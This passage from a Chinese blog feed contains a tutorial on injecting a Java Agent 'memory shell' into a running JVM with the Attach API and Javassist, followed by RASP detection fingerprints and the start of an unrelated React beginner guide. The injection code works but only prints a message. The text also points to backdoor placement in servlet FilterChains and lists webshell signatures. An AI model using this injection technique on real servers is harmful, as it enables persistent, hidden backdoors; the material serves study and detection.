<code>hello.jar</code></strong>：</p><p>在项目根目录下输入下面的命令，编译上面的三个java文件为 <code>.class</code> 并输出到out文件下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d out src/com/test/*.java</span><br></pre></td></tr></table></figure><p>在test目录文件夹下创建 <code>MANIFEST.MF</code> 文件，用于指明<code>premain</code>的入口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: com.test.HelloWorld</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注：<code>MANIFEST.MF</code>最后一行是<strong>空行，不能省略</strong>，否则会报错</p></blockquote><p>根目录下将编译后的 <code>.class</code> 文件和MF文件打包成 <code>hello.jar</code> 包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm hello.jar src/com/test/MANIFEST.MF -C out .</span><br></pre></td></tr></table></figure></li><li><p><strong>编写 <code>agent.jar</code></strong></p><p>代码创建一个Java Agent，动态注入到目标JVM中，修改特定类的方法和行为。</p><p>文件结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hello_project/</span><br><span class="line">├── src</span><br><span class="line">│   └── com</span><br><span class="line">│       └── agent</span><br><span class="line">│           ├── AgentDemo.java</span><br><span class="line">│           ├── TransformerDemo.java</span><br><span class="line">│           └── MANIFEST.MF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>**<code>TransformerDemo.java</code> **：调用Instrumentation API 提供的 <code>ClassFileTransformer</code> 接口，修改目标类中hello方法的字节码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editClassName</span> <span class="operator">=</span> <span class="string">&quot;com.test.hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">editMethodName</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!className.equals(editClassName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>))) <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        <span class="comment">// 调用Javassist库来转换类</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            cp.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctc</span> <span class="operator">=</span> cp.get(editClassName);</span><br><span class="line">            <span class="comment">// 获取目标类的hello方法</span></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctc.getDeclaredMethod(editMethodName);</span><br><span class="line">            <span class="comment">// 修改方法体，将方法体的内容改为仅输出 &quot;java memory shell&quot;</span></span><br><span class="line">            method.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;java memory shell\&quot;);&#125;&quot;</span>);</span><br><span class="line">            <span class="comment">// 生成新的字节码，并返回此字节码作为转换后的字节码。</span></span><br><span class="line">            <span class="type">byte</span>[] byteCode = ctc.toBytecode();</span><br><span class="line">            ctc.detach();</span><br><span class="line">            <span class="keyword">return</span> byteCode;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**<code>AgentDemo.java</code> **：监控内存中的加载类，检测到目标类后调用 transform</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> IOException, UnmodifiableClassException &#123;</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="comment">// 遍历所有已加载的类</span></span><br><span class="line">        <span class="keyword">for</span> (Class aClass : classes) &#123;</span><br><span class="line">            <span class="comment">// 判断是否已加载指定的目标类TransformerDemo.editClassName</span></span><br><span class="line">            <span class="keyword">if</span> (aClass.getName().equals(TransformerDemo.editClassName)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;EditClassName：&quot;</span> + aClass.getName());</span><br><span class="line">                <span class="comment">// 注入 Transformer</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">                inst.retransformClasses(aClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>打包 <code>agent.jar</code></strong></p><p>同样地在agent文件夹下创建 <strong><code>MANIFEST.MF</code></strong>：指定 Agent 类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: com.agent.AgentDemo</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为这里需要使用 <code>javassist.jar</code> 包进行字节码的改写，可以使用maven下载，将下面的依赖添加到 <code>pom.xml</code> 文件中并更新：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.28.0-GA&lt;/version&gt; &lt;!-- 使用最新的版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>找到repository下的 <code>javassist.jar</code> 包并复制到项目根目录下</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241115160938181.png" alt="image-20241115160938181"></p><p>项目根目录下执行命令编译打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 1.编译源文件</span><br><span class="line">javac -d out -cp ./javassist-3.28.0-GA.jar src/com/agent/*.java</span><br><span class="line"># 如果出现编码错误，加上-encoding UTF-8进行编码</span><br><span class="line">javac -encoding UTF-8 -d out -cp ./javassist-3.28.0-GA.jar src/com/agent/*.java</span><br><span class="line"></span><br><span class="line"># 2. 将 javassist 库的内容解压缩</span><br><span class="line">mkdir temp-javassist</span><br><span class="line">cd temp-javassist</span><br><span class="line">jar xf ../javassist-3.28.0-GA.jar</span><br><span class="line"></span><br><span class="line"># 将 javassist 和编译后的类文件一起打包，或者直接把javassist文件夹放到out目录下(z去掉后面的-C javassist .)</span><br><span class="line">cd ..</span><br><span class="line">jar cvfm agent.jar src/com/agent/MANIFEST.MF -C out . -C javassist .</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><ul><li><p>这里需要使用javassist.jar包进行字节码的改写，可以使用maven下载javassist.jar，也可以直接去<a href="https://repo1.maven.org/maven2/javassist/javassist/3.9.0.GA/">网站下载</a>。但是我通过网站下载到的jar包中的对应修改功能模块一直不能被代码识别，建议还是和我一样使用maven下载的javassist.jar包</p></li><li><p>同时，最好删除掉之前生成过的out文件，不然的话后续生成的jar包里面会包含之前生成的class文件</p></li><li><p>这里新建一个temp-javassist的目的是：后续添加到agent.jar包中的javassist相关class类文件都在javassist文件夹下，代码中的 <code>import javassist.*;</code> 会找不到javassist模块。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241115172027516.png" alt="image-20241115172027516"></p></li></ul><p>-cp 表示连接外部jar，因为这里使用到了外部的javassist.jar</p><p>可以使用下面的命令查看jar包内容，确定是否成功打包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar tf agent.jar</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241115185440522.png" alt="image-20241115185440522"></p></blockquote></li><li><p><strong>编写 <code>attacher.jar</code></strong></p><p>通过pid将java agent attach到目标JVM，然后通过LoadAgent加载指定的jar文件</p><p><strong><code>AgentAttach.java</code></strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package com.attacher;</span><br><span class="line"></span><br><span class="line">import com.sun.tools.attach.AgentInitializationException;</span><br><span class="line">import com.sun.tools.attach.AgentLoadException;</span><br><span class="line">import com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line">import com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class AgentAttach &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        String id = args[0];  // 获取目标 JVM 的 PID</span><br><span class="line">        String jarName = args[1];  // 要注入的 Java Agent 的 jar 文件路径</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;id ==&gt; &quot; + id);</span><br><span class="line">        System.out.println(&quot;jarName ==&gt; &quot; + jarName);</span><br><span class="line"></span><br><span class="line">        // Attach 到指定的 JVM 进程</span><br><span class="line">        VirtualMachine virtualMachine = VirtualMachine.attach(id);</span><br><span class="line"></span><br><span class="line">        // 加载 Java Agent</span><br><span class="line">        virtualMachine.loadAgent(jarName);</span><br><span class="line"></span><br><span class="line">        // Detach 后释放与目标 JVM 的连接</span><br><span class="line">        virtualMachine.detach();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;ends&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>MANIFEST.MF</code></strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: com.attacher.AgentAttach</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类似的，编译打包成 <code>attacher.jar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 1. 编译</span><br><span class="line">javac -d out src/com/attacher/*.java</span><br><span class="line"></span><br><span class="line"># 2. 打包</span><br><span class="line">jar cvfm attacher.jar src/com/attacher/MANIFEST.MF -C out .</span><br></pre></td></tr></table></figure></li><li><p><strong>Agent 注入</strong></p><p>启动目标程序：在终端中运行 <code>hello.jar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar hello.jar</span><br></pre></td></tr></table></figure><p>可以看到对应输出的JVM的name和PID。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109000130195.png" alt="image-20241109000130195"></p><p><strong>注入 <code>agent.jar</code></strong>：在另一个终端中运行以下命令，通过Attach API 将 Java Agent (<code>agent.jar</code>)  动态注入到 <code>hello.jar</code> 的 JVM 上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 29976为目标JVM的[PID]</span><br><span class="line">java -jar attacher.jar 29976 &quot;./agent.jar&quot;</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109000159066.png" alt="image-20241109000159066"></p><p>输出”java memory shell”，成功将 <code>System.out.println(&quot;java memory shell&quot;);</code> 对应的字节码修改为 <code>System.out.println(&quot;java memory shell&quot;);</code> </p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109000318944.png" alt="image-20241109000318944"></p></li><li><p><strong>注入内存马</strong></p><p>将 <code>System.out.println(&quot;java memory shell&quot;);</code>  替换为想要执行的内存马代码即可。修改哪个类的哪个方法，是注入内存马的前提和关键。我们需要利用上述方法，将木马注入到<strong>某个一定会执行</strong>的方法内。</p><p>后门的本质就是在目标上留下一个用户可控的参数，黑客通过控制这个参数，达到执行任意系统命令的目的。因此，想要注入内存马，就必然绕不开 request 和 response，因此大多的内存马将目标放在FilterChain上面，通过修改Filter来注入恶意代码</p></li></ol><h1 id="RASP检测"><a href="#RASP检测" class="headerlink" title="RASP检测"></a>RASP检测</h1><p>与注入内存马一样，我们同样可以利用Java的Instrument机制，动态注入我们的检测Agent，获取JVM中所有已加载的Class，匹配内存马特有的可疑特征，让隐藏的内存马现出原型。</p><p>检测步骤：</p><ul><li>1）Attach检测Agent到JVM进程</li><li>2）获取JVM中已经加载的Class列表</li><li>3）根据指纹特征将可疑的Class反编译为Java源码</li><li>4）根据源码检测出Webshell</li></ul><p>所以，我们需要分析常见的内存马存在的一些可疑的特征，比如：</p><p>Agent通过加载Transformer实现功能，Transformer继承ClassFileTransformer接口</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109003250776.png" alt="image-20241109003250776"></p><p>常见的特征包括：</p><ul><li>继承可能实现webshell功能的接口<ul><li>javax.servlet.http.HttpServlet</li><li>org.springframework.web.servlet.handler.AbstractHandlerMapping</li><li>javax.servlet.Filter</li><li>javax.servlet.Servlet</li><li>javax.servlet.ServletRequestListener</li><li>…</li></ul></li><li>名字<ul><li>shell</li><li>memshell</li><li>…</li></ul></li><li>常见已知的Webshell包名：<ul><li>net.rebeyond.*</li><li>com.metasploit.*</li><li>…</li></ul></li></ul><h1 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h1><h2 id="修改字节码"><a href="#修改字节码" class="headerlink" title="修改字节码"></a>修改字节码</h2><h3 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h3><p>修改字节码的技术有很多，比如 ASM、Javassist、BCEL、CGLib 等，这里仅简要介绍 Javassist。Javassist 可以直接用 Java 编码来实现增强，无需关注字节码结构，比 ASM 更简单。Javassist 中核心的类主要有四个：</p><ul><li>CtClass：类信息</li><li>ClassPool：可以从中获取 CtClass，key 为类的全限定名</li><li>CtMethod：方法信息</li><li>CtField：字段信息</li></ul><p>基于这四个类，可以方便地实现增强，比如在指定方法前后增加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认 ClassPool</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 找到 CtClass，重写 com.nsfocus.Demo</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> cp.get(<span class="string">&quot;com.nsfocus.Demo&quot;</span>);</span><br><span class="line"><span class="comment">// 增强方法 test</span></span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">// 前面插入代码</span></span><br><span class="line">m.insertBefore(<span class="string">&quot;&#123; System.out.println(\&quot;javassist start\&quot;); &#125;&quot;</span>);</span><br><span class="line"><span class="comment">// 后面插入代码</span></span><br><span class="line">m.insertAfter(<span class="string">&quot;&#123; System.out.println(\&quot;javassist end\&quot;); &#125;&quot;</span>);</span><br><span class="line"><span class="comment">// Java agent 获取字节码数据</span></span><br><span class="line"><span class="keyword">return</span> cc.toBytecode();</span><br></pre></td></tr></table></figure><p><a href="https://www.html.cn/softprog/java/111251780565900.html">Javassist用法详解</a></p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>创建 <code>HelloWorld.java</code>, <code>hello.java</code>, <code>GetPid.java</code> 三个java文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// HelloWorld.java</span><br><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        hello h1 = new hello();</span><br><span class="line">        GetPid pid = new GetPid();</span><br><span class="line">        h1.hello();</span><br><span class="line">        // 输出当前进程的 pid</span><br><span class="line">        pid.GetPid();</span><br><span class="line">        // 产生中断，等待注入</span><br><span class="line">        Scanner sc = new Scanner(System.in);</span><br><span class="line">        sc.nextInt();</span><br><span class="line">        hello h2 = new hello();</span><br><span class="line">        h2.hello();</span><br><span class="line">        System.out.println(&quot;ends...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// hello.java</span><br><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">public class hello &#123;</span><br><span class="line">    public void hello() &#123;</span><br><span class="line">        System.out.println(&quot;hello world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GetPid.java</span><br><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import java.lang.management.ManagementFactory;</span><br><span class="line"></span><br><span class="line">public class GetPid &#123;</span><br><span class="line">    public void GetPid() &#123;</span><br><span class="line">        String name = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">        System.out.println(&quot;JVM：&quot; + name);</span><br><span class="line">        String pid = name.split(&quot;@&quot;)[0];</span><br><span class="line">        System.out.println(&quot;PID：&quot; + pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Instrumentation的使用：<a href="https://su18.org/post/irP0RsYK1/">Java Instrumentation</a></li><li><a href="https://www.cnblogs.com/nongchaoer/p/15561936.html">JavaWeb 内存马一周目通关攻略</a></li><li><a href="https://www.freebuf.com/articles/web/331954.html">Java Agent 内存马攻防 - FreeBuf网络安全行业门户</a></li><li><a href="https://www.anquanke.com/post/id/274443#h2-0">主机安全技术剖析-手把手教会你防御Java内存马-安全客 - 安全资讯平台</a></li><li><a href="https://www.freebuf.com/articles/web/197823.html">浅谈RASP技术攻防之基础篇 - FreeBuf网络安全行业门户</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java内存马 </tag>
            
            <tag> RASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』React快速入门</title>
      <link href="/posts/64ed.html"/>
      <url>/posts/64ed.html</url>
      
        <content type="html"><![CDATA[<p>项目需要开发一个web平台，已有 HTML + CSS + JavaScript 的一定基础</p><p>本文主要是快速入门react的笔记，仅了解核心的概念和语法，足够后续更改开源项目即可。学习过程主要参考下面的视频和官方文档</p><ul><li><a href="https://www.bilibili.com/video/BV1pF411m7wV">30分钟学会React18核心语法 可能是你学会React最好的机会 前端开发必会框架 无废话精品视频</a></li><li><a href="https://zh-hans.react.dev/">React 官方中文文档</a></li></ul><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol><li><p><strong>react是什么</strong></p><p>我们平常想要在Web网站上展示数据的时候，需要</p><p>（1）发送请求获取数据</p><p>（2）处理数据（过滤、整理格式等）</p><p>（3）操作DOM呈现页面</p><p>在我们操作DOM呈现页面的时候，通常需要DOM-API来操作UI，繁琐、效率低</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.btn&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;span&#x27;</span>)</span><br></pre></td></tr></table></figure><p>react就是帮助我们进行（3），可以更加方便的操作DOM，<strong>将数据渲染为HTML视图</strong></p></li><li><p><strong>react的作用</strong></p><p>原生 JavaScript 的缺点</p><ul><li>原生JavaScript通过<u>DOM-API</u>操作DOM，繁琐且效率低</li><li>使用JavaScript直接操作DOM，浏览器会进行大量的<u>重绘重排</u>。</li><li>原生JavaScript没有<u>组件化编码方案</u>，代码复用率低。</li></ul><p>react：</p><ul><li>组件化模式、声明式编码，提高开发效率及组件复用率</li><li>react native可以通过react语法进行移动端开发</li><li><strong>使用虚拟DOM和Diffing算法，尽量减少与真实DOM的交互，防止了重绘重排</strong>，实现视图的高效更新</li></ul><blockquote><p>虚拟DOM的理解：</p><p><a href="https://www.bilibili.com/video/BV1wy4y1D7JT">尚硅谷React教程</a>  16:45-25:26</p></blockquote></li><li><p><strong>jsx</strong></p><p> react中定义的一种JavaScript 的扩展语法（即react独有的模版语法），将HTML标签和JS代码混合使用。</p><p>例如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&quot;foo&quot;</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>));</span><br><span class="line">root.<span class="title function_">render</span>(element);</span><br></pre></td></tr></table></figure></li><li><p><strong>状态</strong></p><p>状态是组件中用于存储和控制数据的对象，当状态发生变化时，组件会重新渲染以反映新的状态。这使得React组件可以动态地响应用户交互和其他事件。</p><blockquote><p>即产生了数据的更新、交互</p></blockquote></li></ol><h1 id="jsx基本语法"><a href="#jsx基本语法" class="headerlink" title="jsx基本语法"></a>jsx基本语法</h1><ol><li><p><strong>组件</strong></p><p><strong>1）定义</strong></p><p>React 应用程序是由 <strong>组件</strong> 组成的。一个组件是 UI（用户界面）的一部分，它拥有自己的逻辑和外观。组件可以小到一个按钮，也可以大到整个页面。</p><p><strong>React 组件在形式上表现为：返回标签的 JavaScript 函数</strong></p><ul><li>React 组件必须<strong>以大写字母开头</strong></li><li>React 组件都是以<strong>函数形式</strong>表示的</li></ul><p><strong>2）示例</strong></p><p>自定义 MyButton 组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function MyButton() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;button&gt;I&#x27;m a button&lt;/button&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所定义的组件可以嵌套到其他的组件，注意这个应用方法 <code>&lt;MyButton /&gt;</code> ，进行了<strong>自闭和</strong></p><blockquote><p>JSX 比 HTML 更加严格，必须闭合标签，如 <code>&lt;br /&gt;</code>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">export default function MyApp() &#123;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;Welcome to my app&lt;/h1&gt;</span><br><span class="line">      &lt;MyButton /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>父组件</strong>：这里可以认为 <code>MyApp</code> 是一个 <strong>父组件</strong>，将每个 <code>MyButton</code> 渲染为一个“孩子”。这是 React 